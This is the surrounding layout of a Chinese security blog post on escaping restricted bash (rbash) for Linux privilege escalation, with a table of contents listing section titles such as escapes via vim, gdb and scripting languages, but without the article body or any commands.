class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://hybcx.xyz/2024/07/20/linux-ti-quan-xue-xi-yi/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://hybcx.xyz/2024/07/20/linux-ti-quan-xue-xi-yi/')">Linux提权学习之rbash逃逸</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://hybcx.xyz/2024/07/20/linux-ti-quan-xue-xi-yi/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=Linux提权学习之rbash逃逸&amp;url=http://hybcx.xyz/2024/07/20/linux-ti-quan-xue-xi-yi/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://hybcx.xyz" target="_blank">hybcx</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/Linux%E6%8F%90%E6%9D%83/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>Linux提权<span class="tagsPageCount">2</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/07/20/thm-shu-ju-xie-lu/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">THM-数据泄露</div></div></a></div><div class="next-post pull-right"><a href="/2024/07/21/linux-ti-quan-zong-jie/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Linux提权总结</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2024/07/21/linux-ti-quan-zong-jie/" title="Linux提权总结"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-07-21</div><div class="title">Linux提权总结</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这有关于<b style="color:#fff">产品、设计、开发</b>相关的问题和看法，还有<b style="color:#fff">文章翻译</b>和<b style="color:#fff">分享</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">相信你可以在这里找到对你有用的<b style="color:#fff">知识</b>和<b style="color:#fff">教程</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/about"><h1 class="author-info__name">hybcx</h1><div class="author-info__desc">只需热爱, 未来可期！</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hybchenxing" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/1761635300" target="_blank" title="Email"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-rbash%E7%AE%80%E8%BF%B0"><span class="toc-number">2.</span> <span class="toc-text">0x02 rbash简述</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E4%BB%80%E4%B9%88%E6%98%AFrbash"><span class="toc-number">2.1.</span> <span class="toc-text">1、什么是rbash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%A6%82%E4%BD%95%E8%AE%BE%E7%BD%AE%E4%B8%80%E4%B8%AArbash"><span class="toc-number">2.2.</span> <span class="toc-text">2、如何设置一个rbash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">2.3.</span> <span class="toc-text">3、使用场景</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">3.</span> <span class="toc-text">0x03 信息搜集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E5%B8%B8%E7%94%A8%E9%80%83%E9%80%B8%E5%91%BD%E4%BB%A4"><span class="toc-number">4.</span> <span class="toc-text">0x04 常用逃逸命令</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#41-%E5%A6%82%E6%9E%9C%E5%85%81%E8%AE%B8%E4%BD%BF%E7%94%A8"><span class="toc-number">4.1.</span> <span class="toc-text">4.1 如果允许使用“&#x2F;”</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#42-%E5%A6%82%E6%9E%9C%E5%85%81%E8%AE%B8%E4%BD%BF%E7%94%A8cp%E5%91%BD%E4%BB%A4"><span class="toc-number">4.2.</span> <span class="toc-text">4.2 如果允许使用cp命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#43-%E4%BD%BF%E7%94%A8ftp%E8%BF%9B%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">4.3.</span> <span class="toc-text">4.3 使用ftp进行命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#44-%E4%BD%BF%E7%94%A8gdb%E8%BF%9B%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">4.4.</span> <span class="toc-text">4.4 使用gdb进行命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#45-%E4%BD%BF%E7%94%A8moremanless%E8%BF%9B%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">4.5.</span> <span class="toc-text">4.5 使用more&#x2F;man&#x2F;less进行命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#46-%E4%BD%BF%E7%94%A8vim%E8%BF%9B%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">4.6.</span> <span class="toc-text">4.6 使用vim进行命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#47-%E4%BD%BF%E7%94%A8rvim%E6%89%A7%E8%A1%8Cpython"><span class="toc-number">4.7.</span> <span class="toc-text">4.7 使用rvim执行python</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#48-%E4%BD%BF%E7%94%A8scp%E4%BC%A0%E5%85%A5%E8%87%AA%E5%B7%B1%E7%9A%84%E8%84%9A%E6%9C%AC"><span class="toc-number">4.8.</span> <span class="toc-text">4.8 使用scp传入自己的脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#49-%E4%BD%BF%E7%94%A8awk%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">4.9.</span> <span class="toc-text">4.9 使用awk命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#410-%E4%BD%BF%E7%94%A8find%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">4.10.</span> <span class="toc-text">4.10 使用find执行命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#411-%E8%A1%A5%E5%85%85"><span class="toc-number">4.11.</span> <span class="toc-text">4.11 补充</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-cp-binbash%E5%88%B0%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7%E7%9B%AE%E5%BD%95"><span class="toc-number">4.11.1.</span> <span class="toc-text">1、cp &#x2F;bin&#x2F;bash到本地用户目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-set-shell"><span class="toc-number">4.11.2.</span> <span class="toc-text">2、set shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%9B%B4%E6%94%B9path%E6%88%96shell%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-number">4.11.3.</span> <span class="toc-text">3、更改PATH或SHELL环境变量</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E9%80%83%E9%80%B8"><span class="toc-number">5.</span> <span class="toc-text">0x05 编程语言逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#51-python"><span class="toc-number">5.1.</span> <span class="toc-text">5.1 Python</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#52-php"><span class="toc-number">5.2.</span> <span class="toc-text">5.2 PHP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#53-perl"><span class="toc-number">5.3.</span> <span class="toc-text">5.3 perl</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#54-lua"><span class="toc-number">5.4.</span> <span class="toc-text">5.4 lua</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#55-ruby"><span class="toc-number">5.5.</span> <span class="toc-text">5.5 Ruby</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#56-except"><span class="toc-number">5.6.</span> <span class="toc-text">5.6 except</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-%E9%AB%98%E7%BA%A7%E6%8A%80%E6%9C%AF"><span class="toc-number">6.</span> <span class="toc-text">0x06 高级技术</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#61-ssh"><span class="toc-number">6.1.</span> <span class="toc-text">6.1 ssh</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#62-zip"><span class="toc-number">6.2.</span> <span class="toc-text">6.2 zip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#63-tar"><span class="toc-number">6.3.</span> <span class="toc-text">6.3 tar</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#64-pico"><span class="toc-number">6.4.</span> <span class="toc-text">6.4 pico</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#65-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%BF%AE%E5%A4%8D"><span class="toc-number">6.5.</span> <span class="toc-text">6.5 环境变量修复</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-%E7%AE%80%E5%8D%95%E5%AE%9E%E6%88%98"><span class="toc-number">7.</span> <span class="toc-text">0x07 简单实战</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#71-%E5%88%9B%E5%BB%BA%E6%B5%8B%E8%AF%95%E7%94%A8%E6%88%B7"><span class="toc-number">7.1.</span> <span class="toc-text">7.1 创建测试用户</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#711-%E4%B8%BA%E6%96%B0%E7%94%A8%E6%88%B7%E5%BB%BA%E7%AB%8B%E7%9B%AE%E5%BD%95"><span class="toc-number">7.1.1.</span> <span class="toc-text">7.1.1 为新用户建立目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#712-%E6%8C%87%E5%AE%9A%E7%94%A8%E6%88%B7%E5%8F%AF%E4%BB%A5%E8%BF%90%E8%A1%8C%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="toc-number">7.1.2.</span> <span class="toc-text">7.1.2 指定用户可以运行的命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#72-rbash%E9%80%83%E9%80%B8"><span class="toc-number">7.2.</span> <span class="toc-text">7.2 rbash逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#721-%E5%88%87%E6%8D%A2%E7%94%A8%E6%88%B7%E6%97%B6%E9%80%83%E9%80%B8"><span class="toc-number">7.2.1.</span> <span class="toc-text">7.2.1 切换用户时逃逸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#722-ssh%E7%99%BB%E5%BD%95%E6%97%B6%E9%80%83%E9%80%B8"><span class="toc-number">7.2.2.</span> <span class="toc-text">7.2.2 ssh登录时逃逸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#723-%E5%BD%93%E5%89%8Dshell%E4%B8%AD%E9%80%83%E9%80%B8"><span class="toc-number">7.2.3.</span> <span class="toc-text">7.2.3 当前shell中逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#7231-%E7%89%B9%E6%AE%8A%E6%83%85%E5%86%B5"><span class="toc-number">7.2.3.1.</span> <span class="toc-text">7.2.3.1 特殊情况</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#724-%E5%88%A9%E7%94%A8%E7%B3%BB%E7%BB%9F%E5%B8%B8%E8%A7%81%E5%BA%94%E7%94%A8%E9%80%83%E9%80%B8"><span class="toc-number">7.2.4.</span> <span class="toc-text">7.2.4 利用系统常见应用逃逸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#725-%E5%88%A9%E7%94%A8%E7%94%A8%E6%88%B7%E5%AE%89%E8%A3%85%E5%BA%94%E7%94%A8%E9%80%83%E9%80%B8"><span class="toc-number">7.2.5.</span> <span class="toc-text">7.2.5 利用用户安装应用逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-ed-editor"><span class="toc-number">7.2.5.1.</span> <span class="toc-text">1、ed-editor</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-git"><span class="toc-number">7.2.5.2.</span> <span class="toc-text">2、git</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-zip"><span class="toc-number">7.2.5.3.</span> <span class="toc-text">3、zip</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-tar"><span class="toc-number">7.2.5.4.</span> <span class="toc-text">4、tar</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#726-%E5%88%A9%E7%94%A8%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%8E%AF%E5%A2%83%E7%BB%95%E8%BF%87"><span class="toc-number">7.2.6.</span> <span class="toc-text">7.2.6 利用编程语言环境绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-python"><span class="toc-number">7.2.6.1.</span> <span class="toc-text">1、python</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-php"><span class="toc-number">7.2.6.2.</span> <span class="toc-text">2、php</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-perl"><span class="toc-number">7.2.6.3.</span> <span class="toc-text">3、perl</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-lua"><span class="toc-number">7.2.6.4.</span> <span class="toc-text">4、lua</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-ruby"><span class="toc-number">7.2.6.5.</span> <span class="toc-text">5、ruby</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-expect"><span class="toc-number">7.2.6.6.</span> <span class="toc-text">6、expect</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x08-tips"><span class="toc-number">8.</span> <span class="toc-text">0x08 tips:</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x09-%E6%80%BB%E7%BB%93"><span class="toc-number">9.</span> <span class="toc-text">0x09 总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x10-%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">10.</span> <span class="toc-text">0x10 参考文章</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-sha-he-gui-bi/" title="THM-沙盒规避">THM-沙盒规避</a><time datetime="2024-08-21T09:41:49.000Z" title="发表于 2024-08-21 17:41:49">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-fang-huo-qiang/" title="THM-防火墙">THM-防火墙</a><time datetime="2024-08-21T07:07:33.000Z" title="发表于 2024-08-21 15:07:33">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-wang-luo-an-quan-jie-jue-fang-an/" title="THM-网络安全解决方案">THM-网络安全解决方案</a><time datetime="2024-08-21T01:37:19.000Z" title="发表于 2024-08-21 09:37:19">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-kao-tu-di-wei-sheng/" title="THM-靠土地为生">THM-靠土地为生</a><time datetime="2024-08-20T10:08:09.000Z" title="发表于 2024-08-20 18:08:09">2024-08-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-tao-bi-ri-zhi-ji-lu-he-jian-kong/" title="THM-逃避日志记录和监控">THM-逃避日志记录和监控</a><time datetime="2024-08-20T06:51:56.000Z" title="发表于 2024-08-20 14:51:56">2024-08-20</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="hybcx" target="_blank">hybcx</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">204</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">30</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 0.88rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 0.88rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 0.88rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 0.88rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 0.88rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 0.88rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 0.88rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 0.88rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 0.88rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 0.88rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 0.88rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 0.88rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont 